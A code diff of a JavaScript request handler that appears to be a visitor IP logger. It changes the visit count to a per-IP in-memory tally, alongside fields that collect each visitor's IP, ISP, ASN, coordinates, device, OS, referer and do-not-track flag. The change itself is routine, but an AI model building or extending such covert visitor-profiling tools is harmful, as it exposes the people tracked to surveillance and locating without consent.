@@ -101,7 +101,18 @@ function getOperatingSystem(userAgent) {
     return 'Unknown';
 }
 
+// Create a global in-memory store for visit counts
+const visitStore = {};
 
+// Function to increment visit counter for an IP
+function incrementVisitCounter(ip) {
+    if (!visitStore[ip]) {
+        visitStore[ip] = 1; // Initialize count if IP not present
+    } else {
+        visitStore[ip] += 1; // Increment count
+    }
+    return visitStore[ip];
+}
 
 
 function logDebugInfo(reverseDNS) {
@@ -112,7 +123,7 @@ function logDebugInfo(reverseDNS) {
 function createCommonFields(
     ipDetails, port, coords, userAgent, deviceType, os, browserEngine,
     acceptLanguage, acceptEncoding, doNotTrack, referer,
-    visitCounter
+    visitCount
 ) {
     // Helper function to safely format values
     const safeValue = (value, fallback = "Unknown") => `\`${value || fallback}\``;
@@ -123,7 +134,7 @@ function createCommonFields(
         { name: "IP", value: safeValue(ipDetails.query, "Not available"), inline: true },
         { name: "Port", value: `\`${port}\``, inline: true },
         { name: "Provider", value: safeValue(ipDetails.isp), inline: true },
-        { name: "Visit Count", value: `\`${visitCounter}\``, inline: true },
+        { name: "Visit Count", value: `\`${visitCount}\``, inline: true },
         { name: "Organization", value: safeValue(ipDetails.org), inline: true },
         { name: "ASN", value: safeValue(ipDetails.as), inline: true },
         { name: "Continent", value: safeValue(ipDetails.continent), inline: true },
@@ -189,9 +200,8 @@ export default async function handler(req, res) {
             : "Not available";
 
 
-            let visitCounter = 0;
-            const incrementVisitCounter = () => { visitCounter += 1; };
-            incrementVisitCounter();
+             // Increment and retrieve visit count for the current IP
+        const visitCount = incrementVisitCounter(ip);
             
 
         // Perform reverse DNS lookup
@@ -339,7 +349,7 @@ export default async function handler(req, res) {
                     acceptEncoding,
                     doNotTrack,
                     referer,
-                    visitCounter
+                    visitCount
                 );
 
                 // Output or use the fields
